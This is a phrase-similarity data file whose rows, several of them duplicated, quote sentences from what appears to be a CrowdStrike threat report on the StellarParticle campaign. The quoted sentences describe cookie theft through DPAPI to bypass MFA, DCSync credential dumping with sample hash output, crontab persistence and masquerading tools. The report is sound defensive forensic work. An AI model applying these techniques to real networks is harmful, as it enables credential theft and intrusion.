phrase|similarity|adjacent_sentences
a given user account was also authenticating to Active Directory from a given source IP address two years prior|0.8768112017520072|['One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful.', 'An overview of UAL, what information it contains and how it can be leveraged in forensic investigations can be found here.', 'In multiple StellarParticle-related cases, because the threat actor used the same set of accounts during their operations in the environment, CrowdStrike was able to identify previous malicious activity going back multiple years, based solely on UAL data.', 'Even though its only available on Server 2012 and up, UAL can still be used to trace evidence of threat actor activity on legacy systems as long as the activity on the legacy system involves some (deliberate or unintentional) access to a 2012+ system.', 'For example, in addition to tracking SMB activity, UAL databases on Domain Controllers track Active Directory access.', 'This allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior.', 'Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period.', 'TrailBlazer and GoldMax Throughout StellarParticle-related investigations, CrowdStrike has identified two sophisticated malware families that were placed on victim systems in the mid-2019 timeframe: a Linux variant of GoldMax and a completely new family CrowdStrike refers to as TrailBlazer.', 'TrailBlazer Attempted to blend in with a file name that matched the system name it resided on Configured for WMI persistence (generally uncommon in 2019) Used likely compromised infrastructure for C2 Masquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests TrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence.', 'The malware shares high-level functionality with other malware families.', 'In particular, the use of random identifier strings for C2 operations and result codes, and attempts to hide C2 communications in seemingly legitimate web traffic, were previously 6/21observed tactics, techniques and procedures (TTPs) in GoldMax and SUNBURST.']
to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.|0.8612544049638168|['However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.', 'A solution such as CrowdStrike Falcon Identity Threat Detection would help identify these anomalous logons and especially infrequent destinations for accounts.', '(Read how CrowdStrike incident responders leverage the module in investigations in this blog: Credentials, Authentications and Hygiene: Supercharging Incident Response with Falcon Identity Threat Detection.)', 'But how had the threat actor succeeded in authenticating into victim O365 tenants, when multifactor authentication (MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike?', 'Cookie Theft to Bypass MFA Even though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.', 'The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.', 'In Windows, Chrome cookies and saved passwords are encrypted using DPAPI.', 'The user-specific encryption keys for DPAPI are stored under C:\\\\Users\\\\<user>\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\ .', 'To leverage these encryption keys, the threat actor must first decrypt them, either by using the user accounts Windows password, or, in Active Directory environments, by using a DPAPI domain backup key that is stored on domain controllers.', 'Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the users DPAPI key.', 'The cookies were then added to a new session using a Cookie Editor Chrome extension that the threat actor installed on victim systems and removed after using.']
to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.|0.8612544049638168|['However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.', 'A solution such as CrowdStrike Falcon Identity Threat Detection would help identify these anomalous logons and especially infrequent destinations for accounts.', '(Read how CrowdStrike incident responders leverage the module in investigations in this blog: Credentials, Authentications and Hygiene: Supercharging Incident Response with Falcon Identity Threat Detection.)', 'But how had the threat actor succeeded in authenticating into victim O365 tenants, when multifactor authentication (MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike?', 'Cookie Theft to Bypass MFA Even though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.', 'The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.', 'In Windows, Chrome cookies and saved passwords are encrypted using DPAPI.', 'The user-specific encryption keys for DPAPI are stored under C:\\\\Users\\\\<user>\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\ .', 'To leverage these encryption keys, the threat actor must first decrypt them, either by using the user accounts Windows password, or, in Active Directory environments, by using a DPAPI domain backup key that is stored on domain controllers.', 'Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the users DPAPI key.', 'The cookies were then added to a new session using a Cookie Editor Chrome extension that the threat actor installed on victim systems and removed after using.']
to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.|0.8612544049638168|['In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.', 'However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.', 'A solution such asCrowdStrike Falcon Identity Threat Detectionwould help identify these anomalous logons and especially infrequent destinations for accounts.', '(Read how CrowdStrike incident responders leverage the module in investigations in this blog:Credentials, Authentications and Hygiene: Supercharging Incident Response with Falcon Identity Threat Detection.', ')But how had the threat actor succeeded in authenticating into victim O365 tenants, whenmultifactor authentication(MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike?Cookie Theft to Bypass MFAEven though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.', 'The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.', 'In Windows, Chrome cookies and saved passwords are encrypted using DPAPI.', 'The user-specific encryption keys for DPAPI are stored underC:\\\\Users\\\\<user>\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\.', 'To leverage these encryption keys, the threat actor must first decrypt them, either by using the user accounts Windows password, or, in Active Directory environments, by using a DPAPI domain backup key that is stored on domain controllers.Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the users DPAPI key.', 'The cookies were then added to a new session using a Cookie Editor Chrome extension that the threat actor installed on victim systems and removed after using.Shellbags, Falcon Telemetry and RDP Bitmap CacheFrom a forensic standpoint, the use of the Cookie Editor Chrome extension would have been challenging to identify, due to the threat actors penchant for strict operational security.', 'This activity was identified via aNewScriptWrittenevent within Falcon when a JavaScript file was written to disk by a threat actor-initiated Chrome process.']
the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.|0.9256005923690784|['TA Masquerading of System Names During the attempted and successful VPN authentications described above, the threat actor ensured the hostname of their system matched the naming convention of hostnames in the victims environment.', 'This again showed a strong knowledge of the victims internal environment on the part of the threat actor.', 'Not only did the masqueraded hostnames follow the correct naming convention from a broad perspective, they were also valid in terms of what would be expected for the user account the threat actor leveraged (i.e., in terms of the site name and asset type indicated in the hostname).', 'This masqueraded hostname technique has been observed at multiple StellarParticle-related investigations.', '13/21Credential Theft Using Get-ADReplAccount In one example, the threat actor connected into the victims environment via a VPN endpoint that did not have MFA enabled.', 'Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.', 'The threat actor subsequently ran the DSInternals command Get- ADReplAccount targeting two of the victims domains.', 'This command uses the Microsoft Directory Replication Service (MS-DRSR) protocol and specifically the IDL_DRSGetNCChanges method to return account information from Active Directory such as the current NTLM password hashes and previous password hashes used for enforcing password reuse restrictions.', 'A common name for this particular technique is DCSync.11 An example output from Get-AdReplAccount is below: 14/21DistinguishedName: CN=TestUser,OU=Admins,OU=Users,DC=demo,DC=local Sid: S-1-5-21-1432446722-301123485-1266542393-2012 Guid: 12321930-7c05-4011-8a3e-e0b9b6e04567 SamAccountName: TestUser SamAccountType: User UserPrincipalName: TestUser@demo.local PrimaryGroupId: 513 SidHistory: Enabled: True UserAccountControl: NormalAccount AdminCount: True Deleted: False LastLogonDate: 12/2/2021 1:41:46 PM DisplayName: TestUser GivenName: Test Surname: User Description: Admin Account ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-1432446722-301123485-1266542393-512 Secrets NTHash: 84a058676bb6d7de4237e18f09b91156 LMHash: NTHashHistory: Hash 01: 84a058676bb6d7de4237e18f09b91156 Hash 02: e047ebb3b7c463928c928fca95ac0ac8 Hash 03: 6dc3cdb3e559ef00d3521351ace7477e Hash 04: a88355849f35fe7336de23a4ca3e6a9e Hash 05: de9bde95677672295349aa6e1e857704 LMHashHistory: Hash 01: 12227358dd7013c7dbdbd8fdcc0c6668 Hash 02: 6a028636a6f52491424586bb88357f7c Hash 03: c13ef7347853dc3be7e7259fdc8818a1 Hash 04: 6635151746869ce485246037747adae1 Hash 05: 85543f498b007e07a3da662c8a9d450b SupplementalCredentials: ClearText: NTLMStrongHash: de164e3465f163e846a5e1c22a5ac649 Kerberos: Credentials: DES_CBC_MD5 Key: 0013364f00003915 DES_CBC_CRC Key: 0013364f00003915 OldCredentials: DES_CBC_MD5 Key: 00002a46000004bc DES_CBC_CRC Key: 00002a46000004bc Salt: demo.localTestUser Flags: 0 KerberosNew: Credentials: AES256_CTS_HMAC_SHA1_96 Key: afd4d60e8d0920bc2f94d551f62f0ea2a17523bf2ff8ffb0fdade2a90389282f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: f67c2bcbfcfa30fccb36f72dca22a817 Iterations: 4096 DES_CBC_MD5 15/21Key: 00002f34000004ee Iterations: 4096 DES_CBC_CRC Key: 00002f34000004ee Iterations: 4096 OldCredentials: AES256_CTS_HMAC_SHA1_96 Key: b430783ab4c957cf6a03d3d348af27264c0d872932650ffca712d9ebcf778b9f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: dc34bfd5e469edbeada77fac56aa35ae Iterations: 4096 DES_CBC_MD5 Key: 0000345400000520 Iterations: 4096 DES_CBC_CRC Key: 0000345400000520 Iterations: 4096 OlderCredentials: AES256_CTS_HMAC_SHA1_96 Key: 26efd3593712e555f8366bb4b8aff097d09acd93c3a1b6d4ea03c578aad9e087 Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: c38dfbd6c00b5f3b010a07f9e824fc38 Iterations: 4096 DES_CBC_MD5 Key: 000039a500000551 Iterations: 4096 DES_CBC_CRC Key: 000039a500000551 Iterations: 4096 ServiceCredentials: Salt: demo.localTestUser DefaultIterationCount: 4096 Flags: 0 WDigest: Hash 01: 83ed141ab0eaf1ff7694147ba97e1994 Hash 02: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 03: 0c228c5816a79e561d999d489499a12a Hash 04: 83ed141ab0eaf1ff7694147ba97e1994 Hash 05: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 06: 4e7c5ec6ffb6100f0c7f0bc57749bc93 Hash 07: 83ed141ab0eaf1ff7694147ba97e1994 Hash 08: 10265b08a3bb710da516832eaf64368a Hash 09: 10265b08a3bb710da516832eaf64368a Key Credentials: Credential Roaming Created: Modified: Credentials: Figure 10.', 'Get-ADReplAccount example output When executing the Get-ADReplAccount command, the threat actor specified the AD context to be targeted via the NamingContext parameter.', 'This was necessary, as the threat actor was targeting multiple domains.']
the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.|0.9256005923690784|['TA Masquerading of System Names During the attempted and successful VPN authentications described above, the threat actor ensured the hostname of their system matched the naming convention of hostnames in the victims environment.', 'This again showed a strong knowledge of the victims internal environment on the part of the threat actor.', 'Not only did the masqueraded hostnames follow the correct naming convention from a broad perspective, they were also valid in terms of what would be expected for the user account the threat actor leveraged (i.e., in terms of the site name and asset type indicated in the hostname).', 'This masqueraded hostname technique has been observed at multiple StellarParticle-related investigations.', '13/21Credential Theft Using Get-ADReplAccount In one example, the threat actor connected into the victims environment via a VPN endpoint that did not have MFA enabled.', 'Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.', 'The threat actor subsequently ran the DSInternals command Get- ADReplAccount targeting two of the victims domains.', 'This command uses the Microsoft Directory Replication Service (MS-DRSR) protocol and specifically the IDL_DRSGetNCChanges method to return account information from Active Directory such as the current NTLM password hashes and previous password hashes used for enforcing password reuse restrictions.', 'A common name for this particular technique is DCSync.11 An example output from Get-AdReplAccount is below: 14/21DistinguishedName: CN=TestUser,OU=Admins,OU=Users,DC=demo,DC=local Sid: S-1-5-21-1432446722-301123485-1266542393-2012 Guid: 12321930-7c05-4011-8a3e-e0b9b6e04567 SamAccountName: TestUser SamAccountType: User UserPrincipalName: TestUser@demo.local PrimaryGroupId: 513 SidHistory: Enabled: True UserAccountControl: NormalAccount AdminCount: True Deleted: False LastLogonDate: 12/2/2021 1:41:46 PM DisplayName: TestUser GivenName: Test Surname: User Description: Admin Account ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-1432446722-301123485-1266542393-512 Secrets NTHash: 84a058676bb6d7de4237e18f09b91156 LMHash: NTHashHistory: Hash 01: 84a058676bb6d7de4237e18f09b91156 Hash 02: e047ebb3b7c463928c928fca95ac0ac8 Hash 03: 6dc3cdb3e559ef00d3521351ace7477e Hash 04: a88355849f35fe7336de23a4ca3e6a9e Hash 05: de9bde95677672295349aa6e1e857704 LMHashHistory: Hash 01: 12227358dd7013c7dbdbd8fdcc0c6668 Hash 02: 6a028636a6f52491424586bb88357f7c Hash 03: c13ef7347853dc3be7e7259fdc8818a1 Hash 04: 6635151746869ce485246037747adae1 Hash 05: 85543f498b007e07a3da662c8a9d450b SupplementalCredentials: ClearText: NTLMStrongHash: de164e3465f163e846a5e1c22a5ac649 Kerberos: Credentials: DES_CBC_MD5 Key: 0013364f00003915 DES_CBC_CRC Key: 0013364f00003915 OldCredentials: DES_CBC_MD5 Key: 00002a46000004bc DES_CBC_CRC Key: 00002a46000004bc Salt: demo.localTestUser Flags: 0 KerberosNew: Credentials: AES256_CTS_HMAC_SHA1_96 Key: afd4d60e8d0920bc2f94d551f62f0ea2a17523bf2ff8ffb0fdade2a90389282f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: f67c2bcbfcfa30fccb36f72dca22a817 Iterations: 4096 DES_CBC_MD5 15/21Key: 00002f34000004ee Iterations: 4096 DES_CBC_CRC Key: 00002f34000004ee Iterations: 4096 OldCredentials: AES256_CTS_HMAC_SHA1_96 Key: b430783ab4c957cf6a03d3d348af27264c0d872932650ffca712d9ebcf778b9f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: dc34bfd5e469edbeada77fac56aa35ae Iterations: 4096 DES_CBC_MD5 Key: 0000345400000520 Iterations: 4096 DES_CBC_CRC Key: 0000345400000520 Iterations: 4096 OlderCredentials: AES256_CTS_HMAC_SHA1_96 Key: 26efd3593712e555f8366bb4b8aff097d09acd93c3a1b6d4ea03c578aad9e087 Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: c38dfbd6c00b5f3b010a07f9e824fc38 Iterations: 4096 DES_CBC_MD5 Key: 000039a500000551 Iterations: 4096 DES_CBC_CRC Key: 000039a500000551 Iterations: 4096 ServiceCredentials: Salt: demo.localTestUser DefaultIterationCount: 4096 Flags: 0 WDigest: Hash 01: 83ed141ab0eaf1ff7694147ba97e1994 Hash 02: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 03: 0c228c5816a79e561d999d489499a12a Hash 04: 83ed141ab0eaf1ff7694147ba97e1994 Hash 05: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 06: 4e7c5ec6ffb6100f0c7f0bc57749bc93 Hash 07: 83ed141ab0eaf1ff7694147ba97e1994 Hash 08: 10265b08a3bb710da516832eaf64368a Hash 09: 10265b08a3bb710da516832eaf64368a Key Credentials: Credential Roaming Created: Modified: Credentials: Figure 10.', 'Get-ADReplAccount example output When executing the Get-ADReplAccount command, the threat actor specified the AD context to be targeted via the NamingContext parameter.', 'This was necessary, as the threat actor was targeting multiple domains.']
AdFind was renamed to masquerade as a legitimate Windows binary|0.9251118911098818|['While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the scripts execution was logged automatically due to the use of specific keywords.', 'CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.', 'In addition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executed Get-ADReplAccount , the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.', 'The usage of renamed AdFind is consistent with other industry reporting on this campaign.', 'In addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory.', 'This information provided the adversary with a list of accounts possessing particular privileges in this case, the ability to make VPN connections that would be subject to later credential stealing attempts and leveraged to access the victim at a later time.', 'Password Policies/Hygiene In some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account.', 'CrowdStrike determined that in these cases, administrative users had reset their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset.']
AdFind was renamed to masquerade as a legitimate Windows binary|0.9251118911098818|['While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the scripts execution was logged automatically due to the use of specific keywords.', 'CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.', 'In addition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executed Get-ADReplAccount , the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.', 'The usage of renamed AdFind is consistent with other industry reporting on this campaign.', 'In addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory.', 'This information provided the adversary with a list of accounts possessing particular privileges in this case, the ability to make VPN connections that would be subject to later credential stealing attempts and leveraged to access the victim at a later time.', 'Password Policies/Hygiene In some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account.', 'CrowdStrike determined that in these cases, administrative users had reset their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset.']
AdFind was renamed to masquerade as a legitimate Windows binary|0.9251118911098818|['At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a different credential theft technique.One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.', 'While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the scripts execution was logged automatically due to the use of specific keywords.', 'CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.In addition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executedGet-ADReplAccount, the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.', 'The usage of renamed AdFind is consistent with other industry reporting on this campaign.In addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, includingGet-ADUserandGet-ADGroupMemberto query specific members in the directory.', 'This information provided the adversary with a list of accounts possessing particular privileges in this case, the ability to make VPN connections that would be subject to later credential stealing attempts and leveraged to access the victim at a later time.Password Policies/HygieneIn some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account.', 'CrowdStrike determined that in these cases, administrative users had reset their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset.', 'This was possible even though the customers Active Directory was configured to require new passwords to be different from the previous five passwords for a given account.', 'Unfortunately, this check only applies when a user is changing their password via the password change method but if a password reset is performed (changing the password without knowing the previous password), this check is bypassed for an administrative user or a Windows account that has the Reset Password permission on a users account object.12Since theGet-ADReplAccountcmdlet described above included the NTHashHistory values (i.e., previous password hashes) for user accounts, CrowdStrike was able to verify that some administrative accounts indeed had the exact same password hash showing up multiple times in the password history, as well as in the current NTHash value.Close OutThe StellarParticle campaign, associated with the COZY BEAR adversary group, demonstrates this threat actors extensive knowledge of Windows and Linux operating systems, Microsoft Azure, O365, and Active Directory, and their patience and covert skill set to stay undetected for months and in some cases, years.A special thank you to the CrowdStrike Incident Response and CrowdStrike Intelligence teams for helping make this blog possible, especially Ryan McCombs, Ian Barton, Patrick Bennet, Alex Parsons, Christopher Romano, Jackson Roussin and Tom Goldsmith.Endnoteshttps://us-cert.cisa.gov/sites/default/files/publications/CISA_Fact_Sheet-Russian_SVR_Activities_Related_to_SolarWinds_Compromise_508C.pdfhttps://docs.microsoft.com/en-us/partner-center/permissions-overviewhttps://docs.microsoft.com/en-us/partner-center/announcements/2021-december#9https://attack.mitre.org/techniques/T1546/003/CrowdStrike Premium Intelligence Reporthttps://attack.mitre.org/techniques/T1213/001/https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/block-legacy-authenticationhttps://docs.microsoft.com/en-us/exchange/applicationimpersonation-role-exchange-2013-helphttps://github.com/MichaelGrafnetter/DSInternalshttps://attack.mitre.org/techniques/T1003/006/https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/bbee5135-3db2-4824-873a-55104c3610adMITRE ATT&CK FrameworkThe following table maps TTPs covered in this article to theMITRE ATT&CK framework.Indicators of Compromise (IOCs)IndicatorDetailshttp://satkas.waw[.']
directories with random names of a consistent length were navigated to by the same user that ran the tool.|0.8046184930142534|['With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot.', 'Additionally, the threat actor used the nohup command to ignore any hangup signals, and the process will continue to run even if the terminal session was terminated.', 'Figure 5.', 'Crontab entry for GoldMax persistence 7/21Enumeration Tools/Unique Directory Structure Throughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit.', 'While the scripts contents have not been recovered to date, CrowdStrike has observed identical artifacts across multiple StellarParticle engagements that suggest the same or similar tool was used.', 'In each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool.', 'After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victims various domains.', 'In addition, the randomly named directories are typically created in a previously existing directory thats one level off of the root of the C drive.', 'The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters.', 'To date, the names of the directories have always been formed from lowercase alphanumeric characters.', 'For example, Shellbags indicated that directories matching the naming patterns below were browsed to (where XX is a previously existing directory on the system): C:\\\\XX\\\\[a-z0-9]{6} C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3} C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3}\\\\domain.FQDN C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3}\\\\domain-2.FQDN In each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories.']
directories with random names of a consistent length were navigated to by the same user that ran the tool.|0.8046184930142534|['With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot.', 'Additionally, the threat actor used the nohup command to ignore any hangup signals, and the process will continue to run even if the terminal session was terminated.', 'Figure 5.', 'Crontab entry for GoldMax persistence 7/21Enumeration Tools/Unique Directory Structure Throughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit.', 'While the scripts contents have not been recovered to date, CrowdStrike has observed identical artifacts across multiple StellarParticle engagements that suggest the same or similar tool was used.', 'In each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool.', 'After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victims various domains.', 'In addition, the randomly named directories are typically created in a previously existing directory thats one level off of the root of the C drive.', 'The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters.', 'To date, the names of the directories have always been formed from lowercase alphanumeric characters.', 'For example, Shellbags indicated that directories matching the naming patterns below were browsed to (where XX is a previously existing directory on the system): C:\\\\XX\\\\[a-z0-9]{6} C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3} C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3}\\\\domain.FQDN C:\\\\XX\\\\[a-z0-9]{6}\\\\[a-z0-9]{3}\\\\domain-2.FQDN In each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories.']
The threat actor attempted to remotely list running processes on systems using tasklist.exe|0.9297692343457369|['O365 Application Impersonation Another consistent TTP identified during StellarParticle investigations has been the abuse of the ApplicationImpersonation 9 role.', 'When this role was assigned to a particular user that was controlled by the threat actor, it allowed the threat actor to impersonate any user within the O365 environment.', 'These impersonated events are not logged verbosely by the Unified Audit Logs and can be difficult to detect.', 'While the assignment of these ApplicationImpersonation roles were not logged in the Unified Audit Logs, CrowdStrike was able to identify this persistence mechanism via the management role configuration settings, which can be exported with the Exchange PowerShell command: Get-ManagementRoleAssignment -Role ApplicationImpersonation .', 'CrowdStrike then analyzed the exported configuration settings and identified several users (not service accounts) that the threat actor likely gave direct ApplicationImpersonation roles during the known periods of compromise.', 'Remote Tasklist The threat actor attempted to remotely list running processes on systems using tasklist.exe .', 'As tasklist uses WMI under the hood, this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system.', 'Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028.', 'A sample of the information included with this event is below: 12/21Figure 9.', 'Event ID 10028 showing failed execution of remote tasklist This remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in.', 'While unproven, its possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.']
